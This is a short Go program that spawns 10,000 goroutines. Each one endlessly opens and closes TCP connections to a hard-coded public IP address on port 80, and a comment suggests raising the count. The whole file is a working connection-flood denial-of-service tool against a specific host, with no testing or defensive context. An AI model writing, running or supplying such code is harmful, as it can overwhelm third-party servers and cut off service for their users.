package main

import (
	"net"
	"sync"
)

const (
	numGoroutines = 10000  // Increase this number to create more goroutines
	serverIP      = "193.228.196.49"
	serverPort    = "80"
)

func connectAndClose(wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		conn, err := net.Dial("tcp", net.JoinHostPort(serverIP, serverPort))
		if err != nil {
			continue
		}
		conn.Close()
	}
}

func main() {
	var wg sync.WaitGroup

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go connectAndClose(&wg)
	}

	wg.Wait()
}
